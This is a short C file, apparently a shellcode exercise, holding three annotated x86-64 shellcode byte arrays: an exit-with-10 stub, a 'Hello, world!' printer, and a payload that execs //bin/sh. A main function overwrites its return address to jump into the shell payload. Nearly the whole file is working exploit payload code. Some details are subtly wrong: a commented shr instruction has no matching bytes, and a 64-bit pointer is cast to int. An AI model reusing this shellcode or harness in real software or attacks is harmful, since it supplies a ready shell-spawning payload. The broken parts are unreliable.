//check for return value of 10 - echo $? after execution
char exitCode[] = 	"\x48\x31\xc0"	//xor    %rax,%rax
		"\xb0\x3c"	//mov    $0x3c,%al
		"\x48\x31\xff"	//xor    %rdi,%rdi
		"\x40\xb7\x0a"	//mov    $0xa,%dil
		"\x0f\x05";	//syscall 


//check for return value of 10 - 64 bit instructions
char helloWorldCode[] = "\xeb\x20"	//jmp    4000a2 <_start+0x22>
		"\x48\x31\xc0"	//xor    %rax,%rax
		"\xb0\x01"	//mov    $0x1,%al
		"\x48\x31\xff"	//xor    %rdi,%rdi
		"\x40\xb7\x01"	//mov    $0x1,%dil
		"\x5e"	//pop    %rsi
		"\x48\x31\xd2"	//xor    %rdx,%rdx
		"\xb2\x0f"	//mov    $0xf,%dl
		"\x0f\x05"	//syscall 
		"\x48\x31\xc0"	//xor    %rax,%rax
		"\xb0\x3c"	//mov    $0x3c,%al
		"\x48\x31\xff"	//xor    %rdi,%rdi
		"\x40\xb7\x0a"	//mov    $0xa,%dil
		"\x0f\x05"	//syscall 
		"\xe8\xdb\xff\xff\xff"	//callq  400082 <_start+0x2>
		"\x48"	//rex.W
		"\x65"	//gs
		"\x6c"	//insb   (%dx),%es:(%rdi)
		"\x6c"	//insb   (%dx),%es:(%rdi)
		"\x6f"	//outsl  %ds:(%rsi),(%dx)
		"\x2c\x20"	//sub    $0x20,%al
		"\x77\x6f"	//ja     40011f <_start+0x9f>
		"\x72\x6c"	//jb     40011e <_start+0x9e>
		"\x64"	//fs
		"\x21"	//.byte 0x21
		"\x0d"	//.byte 0xd
		"\x0a";	//.byte 0xa

char shellSpawnCode[] = 	"\x48\x31\xff"	//xor    %rdi,%rdi
		"\x57"	//push   %rdi
		"\x57"	//push   %rdi
		"\x5e"	//pop    %rsi
		"\x5a"	//pop    %rdx
		"\x48\xbf\x2f\x2f\x62\x69\x6e"	//movabs $0x68732f6e69622f2f,%rdi
		"\x2f\x73\x68"	//400091:48 c1 ef 08      	shr    $0x8,%rdi
		"\x57"	//push   %rdi
		"\x54"	//push   %rsp
		"\x5f"	//pop    %rdi
		"\x6a\x3b"	//pushq  $0x3b
		"\x58"	//pop    %rax
		"\x0f\x05";	//syscall 


int main() {
	int *ret;
	//ret now points to the return address
	ret =  (int *)&ret + 4; 
	//let the return address contain the shellcode's location
	(*ret) = (int)shellSpawnCode; 
	return 0;
}
